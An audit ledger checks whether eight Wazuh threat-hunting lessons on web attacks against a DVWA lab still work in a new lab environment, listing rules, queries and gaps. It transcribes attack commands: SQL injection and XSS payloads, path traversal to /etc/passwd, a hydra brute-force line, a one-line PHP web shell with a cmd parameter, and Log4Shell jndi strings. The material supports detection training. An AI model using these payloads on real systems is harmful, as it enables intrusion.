# Ledger B — wazuh-threat-hunting `case-01` … `case-08` (web attack cases) against the current Core

Audit date 2026-11-18. Read-only. Sources: `lesson.json` + `explanation.json` (+ `missions.json`) of each lesson under
`/home/ccc/xocrange/contents/academy/wazuh-threat-hunting/lessons/`, the attack-terminal slide images under `../assets/`,
live rule and query checks on the demo Core 192.168.16.52, and `components/siem/{ossec.conf,native-rules.xml}` in the repo.

## 0. Things that apply to all eight lessons

**Structure.** Each lesson is two independent halves written against two different old-lab generations:

- `lesson.json` (slides, "DQL 예시집"): attacker runs CLI tools on the attacker VM `att@192.168.0.202` against `http://dvwa.ccc.com/` (old Core at `192.168.0.189`), then one alerts query with no `agent.name` filter.
- `explanation.json` (manuscript, REV01): learner works in a Windows browser against `http://dvwa.xocrange.lab/`, queries carry `agent.name: "web"`, where = `Windows · Discover · wazuh-alerts-*`.

**The slide attack commands exist only as PNG images** (the "실습 ① 공격 실행" pages). There is no text/command block for them in `lesson.json`; I transcribed them by reading the images. Porting them means regenerating images, not editing JSON text. In this ledger they are listed as "slide commands" with the page number as id.

**Shared assumptions (status identical in every lesson, not repeated in full below):**

| Item | Where | Status vs Core | Note |
|---|---|---|---|
| Attacker VM `att@attacker`, 192.168.0.202, Ubuntu 22.04 | all attack-terminal images; slide p85, p129, p132 | renamed -> external attacker VM (Ubuntu 26.04; demo: 192.168.16.99) | prompt/address visible in every terminal image |
| `http://dvwa.ccc.com/` (HTTP, port 80) | all slide commands, slide p76 | renamed -> `https://dvwa.xoc.range/` (hosts file) or `dvwa.<domain>` | Core ingress is HTTPS 443; plain `http://` and port 80 are unverified. curl will likely need `-k` or the lab CA (unverified) |
| `http://dvwa.xocrange.lab/` | explanation prose/lists/commands (04, 05, 08) | renamed -> `https://dvwa.xoc.range/` | same |
| Core host address 192.168.0.189 | slide p86, p90 image, 07 commands | renamed -> `<core address>` (demo 192.168.16.52) | |
| "Windows" workstation running the browser + Discover | `where` of every query block | missing (no Windows endpoint in Core) | it is only the learner's own PC with a browser; rename `where` to "브라우저 · Discover" |
| Index pattern `wazuh-alerts-*` | every slide "검색 준비" page, every alerts query | same (`wazuh-alerts-4.x-*` matches) | |
| Index pattern `wazuh-archives-*` | Q06-04, Q06-07, Q06-08, Q07-04, prose in 03/04/07 | **missing in practice** | demo Core returned 0 documents for `*` over 347 days in `wazuh-archives-4.x-*`. `ossec.conf` has `logall_json yes`, so archives.json is written but is not reaching the indexer. Anything that is not an alert (2xx/3xx access lines) is invisible in Discover |
| `agent.name: "web"` filter | every explanation query (16 of 16) | renamed -> drop it, or `location: *apache-access` (`agent.name` is always `xoc-manager`, id 000) | live: `agent.name: "web"` = 0 hits. Slide queries have no agent filter, but every slide lists `agent.name` as a column to add and the result screenshots show `web` |
| Fields `data.srcip`, `data.url`, `data.id`, `data.protocol`, `full_log` | all | same | live: all five exist on 102/102 `…/apache-access` alerts in 24 h; `data.srcip` is the real client (192.168.16.99) |
| WAF = ModSecurity CRS in blocking mode in front of DVWA, attack -> 403 | all | same | CRS 3.3.8, `engine_mode: ENABLED` seen live |
| DVWA at security level Low, learner logged in (`admin`/`password`) | explanation 01, 02, 03, 05, 06 | unverified | Core DVWA answers unauthenticated requests 302 -> `/login.php`; the default credentials and Low level were not checked |
| Copy files `examples/rev01/chapterNN/B0N-…txt` | explanation 01–08 prose | missing | no such directory in the course content; references to a book companion bundle |
| "공격 일지" (attack journal) with source IP column | explanation | same (pure note-taking) | |
| Result hit counts printed on slides ("12 hits", "233 hits" …) | "검색 준비" + "결과 화면 ①" pages | will differ | old-environment numbers |
| Wazuh version "4.10" | slide p128, p137 | renamed -> 4.14 | statement "no Log4Shell rule in the default ruleset" still holds on Core |
| Mission `source_pages` | `missions.json` | same | self-record missions, no environment dependency beyond the slides they point at |

**Live rule check (Core Manager):** 31101, 31103, 31104, 31105, 31106, 31151, 31161, 553, 554, 87105, 52502 exist in the ruleset. **100260 (cmdlog) does not exist.** Core-only rules that the lessons do not know about and that will show up in results: `111303` "Web request with a known security scanner User-Agent" (level 6), `119670/119671/119672` ModSecurity JSON audit event / warning / "request blocked by WAF".

**ModSecurity audit records in Core** (affects 02, 05, 08 prose and Q06-04): they are in `wazuh-alerts-*` (not archives), `location` ends in `/modsecurity` (not `/var/log/apache2/modsec_audit.log`), fields are `data.audit_data.action.intercepted`, `data.audit_data.messages`, `data.audit_data.error_messages`; `data.request.request_line` and `data.transaction.*` do not exist (0 hits). The request URI is only inside `full_log` / the `[uri "…"]` part of the messages.

---

## case-01 — SQL 인젝션 (slides p52–63, manuscript 5.5)

**1. Summary.** Sends a `UNION SELECT` payload to DVWA's SQLi page (curl + sqlmap on slides; browser form in the manuscript), sees the WAF 403, and finds the request in alerts by rule 31103 / `data.url`.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| DVWA `/vulnerabilities/sqli/?id=…&Submit=Submit` | slide p55/p56 images, p53, Q05-02, prose | same | path exists in DVWA; payload is blocked by WAF before DVWA's login check, so curl without a session still gets 403 |
| Container `xocrange-dvwa`, file `/var/www/html/vulnerabilities/sqli/source/low.php` | prose | renamed -> `xoc-core-security-path-dvwa-1` | file path inside the container unverified; prose only, not executed |
| Tool `curl` | p55 image, p57 | same | |
| Tool `sqlmap` (`-u … --batch --technique=B --flush-session`) | p56 image, p57, p63 | **missing** (not on attacker VM) | |
| Browser DevTools Network tab, DVWA form "User ID" | manuscript list | same (needs logged-in DVWA session) | unverified login |
| Rule 31103 "SQL injection attempt." | p53, p54, p63, table, prose | same | live: 2 hits today, `data.id 403`, location `…/apache-access` |
| Rule 31161 described as "같은 IP에서 다수 시도" | p54, slide query | exists but **wrong meaning** | 31161 = "Multiple web server 501 error code"; the same-IP SQLi frequency rule is 31152. Content error independent of the port |
| Rule 31106 ("11번(31106)으로 이어서 확인") | p63 | same (exists) | 0 hits on Core; cannot fire while everything is blocked |
| CRS 942xxx | p53 | same | 942100/942190/942360 seen live in `data.audit_data.error_messages` |
| `agent.name: "web"` | Q05-02 | renamed | see section 0 |
| Reference to "도식 5-3" reach-point model, "5.6" (WAF audit) | prose | cross-section | 5.6 is not in my lesson range |

**3. Command blocks.** No `command` blocks in the manuscript. Slide commands (images):

| Id | Where | Tool | Target | Runs in Core |
|---|---|---|---|---|
| p55 | attacker VM | curl | `http://dvwa.ccc.com/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit` | needs rename (host, https) |
| p56 | attacker VM | sqlmap | `http://dvwa.ccc.com/vulnerabilities/sqli/?id=1&Submit=Submit` | tool missing |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data in Core? |
|---|---|---|---|
| slide p58 | alerts | `rule.id:(31103 or 31161) OR data.url:(*union* or *select* or *%27* or *1=1* or *sleep\(*)` | yes (live: 6 hits). Note `data.url` is a keyword field: `*union*` = 0 hits, `*UNION*` = 2 hits, so the lowercase wildcards do not match the lesson's own uppercase payload; hits come from the rule ids and `%27` |
| Q05-02 | alerts | `agent.name`, `data.url` (`*vulnerabilities/sqli/*`, `*UNION*`) | only after removing `agent.name: "web"` (live without it: 2 hits) |

**5. Images.** 12 total. Slides 6: 2 attacker-terminal captures + 4 Discover result captures (all old environment; no `path`). Manuscript 6: 5 with `screens` in the path, 1 diagram (`figures`). Old-environment total: 11; diagrams: 1.

**6. Blocking gaps.** sqlmap missing on the attacker VM (half of the slide exercise and the "automation trace" reading on p63). Everything else is rename-only.

---

## case-02 — XSS (slides p64–74, manuscript 5.7)

**1. Summary.** Sends `<script>alert(1)</script>` and an `onerror` variant to DVWA reflected XSS, sees 403, finds rule 31105.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| DVWA `/vulnerabilities/xss_r/?name=…` | p65, p67 image, Q05-04 | same | |
| curl | p67 image | same | |
| Rule 31105 "XSS (Cross Site Scripting) attempt." | p65, p66, p74, Q05-04, prose | same | live: 1 hit today, 403 |
| CRS 941xxx | p65 | same (CRS 3.3.8) | not individually verified |
| Claim "rule 31105 attached to both requests" (script and `img onerror`) | p74 | unverified | 31105's pattern has `IMG%20` in upper case only; lowercase `%3Cimg%20…onerror` may get 31101 instead (depends on rule case handling) |
| "Q05-03 … `data.request.request_line: *xss_r*` → `intercepted: true`" | prose | renamed -> alerts, `location: *modsecurity`, `data.audit_data.action.intercepted` | `data.request.request_line` missing in Core (0 hits) |
| `agent.name: "web"` | Q05-04 | renamed | |
| Browser back button, DVWA menu "XSS (Reflected)" | manuscript list | same (needs login) | |

**3. Command blocks.** None in the manuscript. Slide commands:

| Id | Where | Tool | Target | Runs in Core |
|---|---|---|---|---|
| p67a | attacker VM | curl | `…/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E` | needs rename |
| p67b | attacker VM | curl | `…/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(1)%3E` | needs rename |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p69 | alerts | `rule.id:31105 OR data.url:(*\<script* or *%3Cscript* or *onerror* or *javascript\:*)` | yes (live: 1 hit) |
| Q05-04 | alerts | `agent.name`, `data.url: *vulnerabilities/xss_r/*`, `rule.id: "31105"` | after removing `agent.name` (today's sample used `/?…` so path part untested; rule + field exist) |

**5. Images.** 8 total. Slides 5 (1 terminal + 4 Discover). Manuscript 3: 2 `screens`, 1 diagram. Old-environment: 7; diagrams: 1.

**6. Blocking gaps.** None beyond renames. The WAF-audit cross-reference needs the Core field names.

---

## case-03 — 디렉터리 트래버설 / LFI (slides p75–84, manuscript 5.8)

**1. Summary.** Requests `../../etc/passwd` and `php://filter` through DVWA File Inclusion, compares raw vs `%2F`-encoded traversal and which Wazuh rule (31104 vs 31101) each gets.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| DVWA `/vulnerabilities/fi/?page=…` (`file1.php` link) | p76, p78 image, manuscript lists | same | |
| curl `--path-as-is` | p76, p78, p79 | same | |
| Rule 31104 "Common web attack." | p76, p77, p84, table, prose | same (exists) | 0 hits on Core in 24 h; raw `../` was not sent today. Today's encoded sample (`..%2f..%2fetc%2fpasswd`) got 31101 + 119672, which matches the manuscript's table |
| Rule 31101 "Web server 400 error code." | table, prose, blind box | same | live: 91 hits/24 h. On Core this includes ingress noise from `172.18.0.1` on `/siem/api/…` (401/403), so unfiltered 31101 searches are noisier than in the old lab |
| CRS 930xxx | p76 | same | not individually verified |
| Marker `bookcase=book05-browser-path…` | manuscript, Q05-05 | same | free-text tag |
| `wazuh-archives-*` ("그 요청은 archives에만 남는다") | blind box | missing in practice | archives empty on Core |
| "응답 크기(full_log 의 숫자)" | p84 | same | access log line format has an extra trailing `xoc_id=…` on Core |
| `agent.name: "web"` | Q05-05 | renamed | |

**3. Command blocks.** None in the manuscript. Slide commands:

| Id | Where | Tool | Target | Runs in Core |
|---|---|---|---|---|
| p78a | attacker VM | curl --path-as-is | `…/vulnerabilities/fi/?page=../../../../etc/passwd` | needs rename |
| p78b | attacker VM | curl | `…/vulnerabilities/fi/?page=php://filter/resource=index.php` | needs rename |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p80 | alerts | `rule.id:31104 OR data.url:(*../* or *..%2F* or *..%5C* or *etc/passwd* or *php\://*)` | rule and field exist; expected yes once the request is sent. Case caveat: `*..%2F*` (upper) will not match a lowercase `..%2f` URL |
| Q05-05 | alerts | `agent.name`, `data.url: *book05-browser-path*` | after removing `agent.name` |

**5. Images.** 8 total. Slides 4 (1 terminal + 3 Discover). Manuscript 4: 3 `screens`, 1 diagram. Old-environment: 7; diagrams: 1.

**6. Blocking gaps.** None beyond renames; the "200 would only be in archives" teaching point cannot be shown on Core (archives empty).

---

## case-04 — 웹 스캐너와 경로 탐색 (slides p85–97, manuscript 6.2)

**1. Summary.** Runs dirb / gobuster / nikto against DVWA (slides) or probes admin paths by hand and with a 23-line gobuster list (manuscript), then finds the 4xx burst via rule 31151 and per-IP counts.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| Attacker VM "192.168.0.202, Ubuntu 22.04" + `sudo apt install -y nmap hydra sqlmap nikto dirb gobuster curl netcat-openbsd python3` | p85 | renamed -> Ubuntu 26.04; install line unverified | needs internet + sudo on the attacker VM |
| Tools hydra, sqlmap, nikto, dirb, gobuster | p85, p88–p91, C06-07 | **missing** | nmap, curl, nc, python3 present |
| Tool xfreerdp, xvfb-run; "xOC Range 내부 공격 컨테이너"; `ssh -p 2202 ccc@192.168.0.189` password `ccc` | p85, p86 | **missing** | no in-lab attacker host, no Windows/RDP target; port 2202 does not exist (office PC will be `-p 2222 student@…`, different role) |
| `~/lab/pw.txt` 12-line dictionary | p85 | same (learner creates it) | used by case-06 |
| Wordlist `/usr/share/dirb/wordlists/common.txt` | p88, p89, p91 | missing (comes with dirb) | |
| gobuster v2 syntax `-m dir` ("Ubuntu 22.04 의 gobuster(v2)") | p89, p91, C06-07, option table | missing; if installed on 26.04 it is v3 (`gobuster dir …`), so the syntax and the `-a` option text change | |
| nikto output: Target IP 192.168.0.189, port 80, `Apache/2.4.52 (Ubuntu)` | p90 image | renamed / differs | |
| gobuster "Wildcard response found … => 403" | p89 image | unverified | in the old lab the gobuster UA itself was blocked; on Core CRS 913100 + rule 111303 should behave the same |
| `http://dvwa.xocrange.lab/login.php?book06=known` -> 200 | manuscript list | renamed (host) | |
| `/book06-missing`, `/admin/`, `/phpmyadmin/`, `/wp-admin/`, `/manager/html` -> 404 | manuscript list, Q06-01 | unverified | on Core an unauthenticated unknown DVWA path may answer 404 (today `/admin?…` -> 404, 31101) — consistent, but the four paths were not sent |
| `/robots.txt` -> 200, `/login.php` -> 200 | C06-07 result | unverified | |
| Rule 31101 | Q06-01 result, prose | same | |
| Rule 31151 (frequency 14, timeframe 90 s, same_source_ip) | p87, p92, p97, Q06-02, prose | same | live rule XML: `frequency="14" timeframe="90"`, `<same_source_ip />`; 3 hits today |
| `data.srcip` Terms aggregation / Visualize in Discover | p87, p97 | same | field exists; behind ingress the client address is still the real one |
| Editor `nano`, `ls`, `cat` on attacker VM | C06-04..06 | same (nano unverified on 26.04 minimal) | |
| Reference to sections 6.7, 6.8 | prose | cross-section | |
| `agent.name: "web"` | Q06-01, Q06-02 | renamed | |

**3. Command blocks**

| Id | Where | Tool | Target / path | Runs in Core |
|---|---|---|---|---|
| C06-04 | 공격자 VM · 터미널 | ls | `~/book06-paths.txt` | yes |
| C06-05 | 공격자 VM · 터미널 | nano | `~/book06-paths.txt` | yes (nano presence unverified) |
| C06-06 | 공격자 VM · 터미널 | cat | `~/book06-paths.txt` | yes |
| C06-07 | 공격자 VM · 터미널 | gobuster (v2 `-m dir`, `-t 1`, `-a book06-scan`) | `http://dvwa.xocrange.lab/` | tool missing (+ rename; a `curl` loop over the list with `-A book06-scan` is the drop-in) |
| p88 (image) | attacker VM | dirb | `http://dvwa.ccc.com/` + common.txt | tool missing |
| p89 (image) | attacker VM | gobuster | `http://dvwa.ccc.com/` | tool missing |
| p90 (image) | attacker VM | nikto `-maxtime 60s` | `http://dvwa.ccc.com/` | tool missing |
| p85 (text) | attacker VM | apt install | — | unverified |
| p86 (text) | attacker VM -> in-lab attack container | ssh `-p 2202 ccc@192.168.0.189`, `which hydra xfreerdp xvfb-run nmap` | — | host missing |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p92 | alerts | `rule.id:31151 OR (data.id:404 AND data.srcip:*)` | yes (live: 5 hits) |
| Q06-01 | alerts | `agent.name`, `data.url:("/admin/" OR "/phpmyadmin/" OR "/wp-admin/" OR "/manager/html")` | after removing `agent.name`; exact-match on `data.url` requires the request to have no query string |
| Q06-02 | alerts | `agent.name`, `rule.id: "31151"` | after removing `agent.name` (live: 3 hits) |

**5. Images.** 11 total. Slides 7 (3 terminal + 4 Discover). Manuscript 4: 3 `screens`, 1 diagram. Old-environment: 10; diagrams: 1.

**6. Blocking gaps.** dirb, gobuster, nikto are all missing on the attacker VM — the entire slide exercise and C06-07. The concept page p85–86 describes an in-lab attack container, RDP tooling and a Windows target that Core does not have.

---

## case-05 — 스캐너 User-Agent (slides p98–106, manuscript 6.3 "헤더와 메서드 바꾸기")

**1. Summary.** Sends requests with scanner User-Agents (sqlmap, Nikto, python-requests) and a `PROPFIND` method, then finds them through `full_log`, `data.protocol` and the WAF audit record.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| curl `-A` / `-v` with sqlmap and Nikto UA strings | p99 image, p100 | same | only the name is sent; the tools are not needed |
| `python3 -c "import requests; …"` -> 200 | p99 image, p100 | unverified | python3 present; the `requests` module was not checked. On Core the result is 200 only after following the 302 to `/login.php` |
| `full_log` text search by tool name | p98, p101, p106, Q06-03 | same | live: `full_log: sqlmap` = 2 hits |
| Rule that fires on the UA request: 31101 (403) | implied by slides | changed -> **111303** "Web request with a known security scanner User-Agent" + 119672 | Core has a dedicated scanner-UA rule the lesson says does not exist ("User-Agent는 별도 필드로 추출되지 않으므로…" still true for the field, but the lesson's premise "no rule, search full_log" is weaker). 111303's list has sqlmap, nikto, nmap, gobuster, hydra… but **not** `python-requests` |
| python-requests request appearing in alerts | p101 query | missing | it returns 302/200 -> no alert, archives empty -> not findable |
| "curl 헬스체크" as benign automation to exclude by IP | p98, p106 | unverified | Core noise source is ingress `172.18.0.1` on `/siem/…` |
| Chrome DevTools "Network conditions" custom UA `sqlmap/1.0 book06-ua` | manuscript list | same (learner browser) | |
| `http://dvwa.xocrange.lab/book06-ua`, `/book06-method` | manuscript, Q06-03, Q06-05 | renamed (host) | exact `data.url: "/book06-ua"` match is fine |
| `location: "/var/log/apache2/modsec_audit.log"` | Q06-04 | renamed -> `location: *modsecurity` | Core location is `xoc-native/<64 hex>/modsecurity` |
| `data.request.request_line` | Q06-04 | **missing** -> search `full_log: *book06-ua*` on the modsecurity alerts | 0 documents have this field |
| `intercepted: true`, `messages` | Q06-04 result | renamed -> `data.audit_data.action.intercepted`, `data.audit_data.messages` | live: present on 64 / 72 docs |
| `wazuh-archives-*` for the WAF audit record | Q06-04 | renamed -> `wazuh-alerts-*` | archives empty; ModSecurity records are alerts 119670–119672 on Core |
| CRS 913100 (scanner UA), 949110 (anomaly score), 911100 (method not allowed) | Q06-04/Q06-05 results, prose | same (CRS 3.3.8) | 949110 seen live; 913100/911100 not individually verified |
| `fetch('/book06-method', {method:'PROPFIND'})` from DevTools Console on the login.php tab | code, prose | same | |
| `data.protocol: "PROPFIND"` -> 403 | Q06-05 | unverified | field exists; no PROPFIND sample today (today's TRACE got 403 / 31101) |
| `agent.name: "web"` | Q06-03, Q06-04, Q06-05 | renamed | |

**3. Command blocks.** None in the manuscript (browser only). Slide commands:

| Id | Where | Tool | Target | Runs in Core |
|---|---|---|---|---|
| p99a | attacker VM | curl -A "sqlmap/1.6.4#stable (https://sqlmap.org)" | `http://dvwa.ccc.com/` | needs rename |
| p99b | attacker VM | curl -A "Mozilla/5.00 (Nikto/2.1.5) …" | `http://dvwa.ccc.com/` | needs rename |
| p99c | attacker VM | python3 + requests | `http://dvwa.ccc.com/` | needs rename; `requests` module unverified (TLS verification will also fail unless `verify=False`/CA) |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p101 | alerts | `full_log:(sqlmap or nikto or nmap or masscan or zgrab or dirbuster or gobuster or "python-requests")` | yes for blocked UAs (live sqlmap: 2 hits: 111303 access line + 119672 audit record). Without an agent/location filter it also searches sysmon/auditd/osquery `full_log`, e.g. any process command line containing `nmap` |
| Q06-03 | alerts | `agent.name`, `data.url: "/book06-ua"`, `full_log: "sqlmap"` | after removing `agent.name`; rule shown will be 111303, not 31101 |
| Q06-04 | archives | `agent.name`, `location`, `data.request.request_line` | **no** — wrong index, wrong location value, field missing. Core form: alerts, `location: *modsecurity AND full_log: *book06-ua*` |
| Q06-05 | alerts | `agent.name`, `data.protocol: "PROPFIND"`, `data.url: "/book06-method"` | after removing `agent.name` (expected; unverified) |

**5. Images.** 10 total. Slides 5 (1 terminal + 4 Discover). Manuscript 5: 3 `screens`, 2 diagrams. Old-environment: 8; diagrams: 2.

**6. Blocking gaps.** Q06-04 cannot work as written (archives empty, field/location names differ). Screens and narrative about the alert rule need to account for Core rule 111303. No tool gap.

---

## case-06 — 웹 로그인 브루트포스 (slides p107–115, manuscript 6.5 "인증 시도")

**1. Summary.** Brute-forces DVWA's login with hydra (slides) or types three passwords into the login form and the Brute Force page (manuscript), then shows that the attempts are visible only as POST/GET access records, not as alerts.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| Tool `hydra -l admin -P ~/lab/pw.txt -t 4 dvwa.ccc.com http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:failed"` | p108 image, p109 | **missing** | also plain HTTP module; Core needs `https-post-form` |
| `~/lab/pw.txt` | p108, p109 | same (created in case-04 p85) | |
| DVWA `/login.php` POST, account `admin`, password `password` | p108, manuscript tables | unverified | DVWA login path exists (302 to it seen); default credential not verified. DVWA login also carries a `user_token` CSRF field, which the hydra line ignores (in the old lab: "0 valid password found") |
| DVWA `/vulnerabilities/brute/?username=admin&password=…` (GET, Low) | manuscript, Q06-08 | same path; needs logged-in session + Low level (unverified) | |
| Login responses: fail 302 -> `login.php`, success 302 -> `index.php`; Brute page 200 | manuscript tables | same expected (today: 3 failed logins -> 302 ×3, no alert) | |
| "기본 룰은 없으므로" (no default rule for web login brute force) | p107, p115 | same | |
| Alerts containing POST `/login.php` rows (12 hits on slide) | p110–p115 | unverified / likely different | in the old lab the hydra requests were alerts (403/31101 via hydra's UA). On Core hydra UA would also hit 111303. With curl instead of hydra the POSTs are 302 -> no alert at all |
| `wazuh-archives-*` holding 302/200 access records | Q06-07, Q06-08, blind box | **missing in practice** | archives empty: 0 hits for `data.protocol: "POST" AND data.url: "/login.php"` and for `*vulnerabilities/brute/*`; alerts has 0 apache-access docs with 200/302 |
| `data.srcip` Visualize per IP | p115 | same | |
| `agent.name: "web"` | Q06-07, Q06-08 | renamed | |
| Reference to 6.6 | predict box | cross-section | |

**3. Command blocks.** None in the manuscript (browser only). Slide command:

| Id | Where | Tool | Target | Runs in Core |
|---|---|---|---|---|
| p108 | attacker VM | hydra http-post-form | `dvwa.ccc.com` `/login.php` | tool missing (+ rename, https) |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p110 | alerts | `data.protocol:POST AND data.url:(*login* or *wp-login* or *signin* or *admin*) AND data.id:(200 or 302 or 401 or 403)` | fields exist. Live: 0 hits for DVWA logins (302 does not alert). Caution: on Core `*admin*`/`*login*` + 401/403 can match ingress noise on `/siem/…` POSTs (44 POST alerts today, all `172.18.0.1` `/siem/api/…`) |
| Q06-07 | archives | `agent.name`, `data.protocol: "POST"`, `data.url: "/login.php"` | **no** — archives empty |
| Q06-08 | archives | `agent.name`, `data.url: *vulnerabilities/brute/*`, `*username=admin*` | **no** — archives empty |

**5. Images.** 9 total. Slides 5 (1 terminal + 4 Discover). Manuscript 4: 3 `screens`, 1 diagram. Old-environment: 8; diagrams: 1.

**6. Blocking gaps.** (a) hydra missing — the whole slide exercise. (b) Archives index has no data — both manuscript queries and the lesson's central point ("not in alerts, only in archives") cannot be demonstrated. (c) DVWA default login/Low level unverified.

---

## case-07 — 웹셸 업로드와 실행 (slides p116–126, manuscript 7.2 "웹셸 파일")

**1. Summary.** An administrator drops a PHP web shell into the WAF container's web root, the attacker requests it with `?cmd=id`, and the learner correlates the FIM "file added" alert (554) with the access record.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| Shell on the lab host: `ccc@kt66-host`, `sudo docker exec` | p119 image; C07-01, C07-05 ("xOC Range VM · 터미널") | unverified | whether a learner has a host shell + docker rights on Core is a policy question; the image title bar and prompt show **`kt66 호스트·공격자` / `kt66-host`** and p120's caption says "kt66 의 web" — user-visible `kt66` (forbidden by naming rule) |
| Container `kt66-web` (slides) / `xocrange-web` (manuscript) | p119 image; C07-01..07, prose | renamed -> `xoc-core-security-path-web-1` | |
| `/bin/bash`, `vim`, `grep`, `ls`, `cat`, `rm`, `mkdir` inside the web container | C07-01..06 | unverified | |
| **Wazuh agent inside the web container** with `/var/ossec/etc/ossec.conf` | C07-02 | **missing** | Core has no per-device agents; the web container has no `/var/ossec` |
| **FIM (syscheck) on `/var/www`, `realtime="yes"`** | p117, p118, p121, C07-02, Q07-01 | **missing** | Core Manager syscheck watches only `/etc` of the siem container (`ossec.conf`: `<directories>/etc</directories>`, frequency 43200). Live: 0 docs with `syscheck.path`, 0 hits for 553/554 |
| `/var/www/html/uploads/` writable; `shell.php` / `book07-shell.php`; pre-existing `invoice.pdf.exe` | p119 image, p121, p126, C07-02..06 | unverified | directory layout of Core's web container not checked |
| Default vhost "landing" with docroot `/var/www/landing` (reason for the 404) | prose, p126 | unverified / likely missing | Core web is a reverse proxy to dvwa/juiceshop; request by IP goes through ingress |
| `http://192.168.0.189/uploads/shell.php?cmd=id` -> 404, `Apache/2.4.52 (Ubuntu) Server at 192.168.0.189 Port 80` | p119/p120 images, p121, prose | renamed -> `https://<core>/…`; response unverified | by-IP request hits Core ingress (platform), not the lab web server; `Host: dvwa.xoc.range` + `?cmd=id` would more likely be 403 by CRS (today `;printf` injection -> 403) |
| "web 은 WAF(프록시)라 PHP 를 실행하지 않는다" | p117, p120, p121 | same in principle | |
| Rule 554 "File added to the system.", 553 "File deleted." | p117, p118, p126, Q07-01, prose | rule exists; **no data source** | |
| Fields `syscheck.path`, `syscheck.event` | p118, p122, Q07-01 | mapped in template; no data | |
| VirusTotal integration, rule 87105 "26 engines detected" | p117, p126 | rule exists; integration **missing** | no `<integration>` in Core `ossec.conf` (needs an external API key) |
| ClamAV scanning `/var/www` every 20 s, rule 52502 | p117, blind box | rule exists; ClamAV **missing** | no clamav anywhere in `components/` |
| `cmdlog` shell-command logging, rule **100260**, `rule.groups: "cmdlog"` | blind box | **missing** | rule not in Core ruleset; 0 hits. Nearest Core equivalents: `/sysmon`, `/auditd` locations (host-level) |
| `wazuh-archives-*` fallback | Q07-02 result | missing in practice | |
| "55번 실습과 연결" | p126 | cross-lesson | outside my range |
| `agent.name: "web"` | Q07-01, Q07-02 | renamed | |

**3. Command blocks**

| Id | Where | Tool | Target / path | Runs in Core |
|---|---|---|---|---|
| C07-01 | xOC Range VM · 터미널 | docker exec -it | `xocrange-web` `/bin/bash` | needs rename (`xoc-core-security-path-web-1`); host-shell access unverified |
| C07-02 | web 컨테이너 · 셸 | grep / ls | `/var/ossec/etc/ossec.conf`, `/var/www/html/uploads[/book07-shell.php]` | path missing (no agent config); uploads dir unverified |
| C07-03 | web 컨테이너 · 셸 | vim | `/var/www/html/uploads/book07-shell.php` | unverified (vim, directory) |
| C07-04 | web 컨테이너 · 셸 | cat, exit | same file | unverified |
| C07-05 | xOC Range VM · 터미널 | docker exec -it | `xocrange-web` | needs rename |
| C07-06 | web 컨테이너 · 셸 | cat, rm -i, ls | same file | unverified |
| C07-07 | web 컨테이너 · 셸 | exit | — | yes |
| p119a (image) | `ccc@kt66-host` | sudo docker exec … sh -c 'echo "<?php system($_GET["cmd"]); ?>" > /var/www/html/uploads/shell.php' | `kt66-web` | needs rename; no FIM to observe it |
| p119b / p120 (image) | attacker VM | curl | `http://192.168.0.189/uploads/shell.php?cmd=id` | needs rename; response differs |

**4. Query blocks**

| Id | Index | Fields / rules | Returns data? |
|---|---|---|---|
| slide p122 | alerts | `(syscheck.event:added AND syscheck.path:*www* AND syscheck.path:(*.php or *.jsp or *.aspx)) OR (data.url:*upload* AND data.url:(*cmd=* or *exec=* or *system\(*))` | first half: **no** (no FIM on the web root). Second half: only if the request is a 4xx alert (expected, since CRS should block `cmd=id`; unverified) |
| Q07-01 | alerts | `agent.name`, `rule.id: "554"`, `syscheck.path: *shell.php` | **no** — no syscheck data for the web container, and `agent.name` would be `xoc-manager` |
| Q07-02 | alerts (fallback archives) | `agent.name`, `data.url: *shell.php*` | after removing `agent.name`, only if the request alerts (4xx); archives fallback empty |

**5. Images.** 8 total. Slides 5 (2 terminal + 3 Discover); the two terminal images show `kt66` in the title bar/prompt/comment. Manuscript 3: 2 `screens`, 1 diagram. Old-environment: 7; diagrams: 1.

**6. Blocking gaps.** (a) No FIM on the web server's document root and no agent in the web container — the lesson's primary evidence (554/553, `syscheck.path`) does not exist. (b) VirusTotal integration and ClamAV absent (87105, 52502 narrative). (c) Custom rule 100260/cmdlog absent. (d) Learner host shell + `docker exec` into the WAF container is an old-lab affordance that is unverified in Core. (e) Landing-site vhost explanation of the 404 does not apply. This is the least portable lesson of the eight; the office PC (Wazuh agent `office-pc01`) could host a FIM exercise, but not a web-root one.

---

## case-08 — Log4Shell (slides p127–137, manuscript 7.3)

**1. Summary.** Sends `${jndi:ldap://…}` in the User-Agent, a URL parameter and (obfuscated) in an `X-Api-Version` header, then hunts for `jndi` in `full_log` / `data.url` and notes what the access log cannot see.

**2. Environment assumptions**

| Item | Where | Status | Note |
|---|---|---|---|
| Callback address `192.168.0.202:1389` (LDAP), `:1099` (RMI) = attacker VM | p129, p131 image, p132, code, list, table | renamed -> attacker VM address (demo 192.168.16.99) | string only; no listener is started and no vulnerable Java service exists (the lesson says so) |
| curl `-H 'User-Agent: ${jndi:…}'`, `-H 'X-Api-Version: …'`, `-A '${jndi:rmi://…}'` | p131 image | same | |
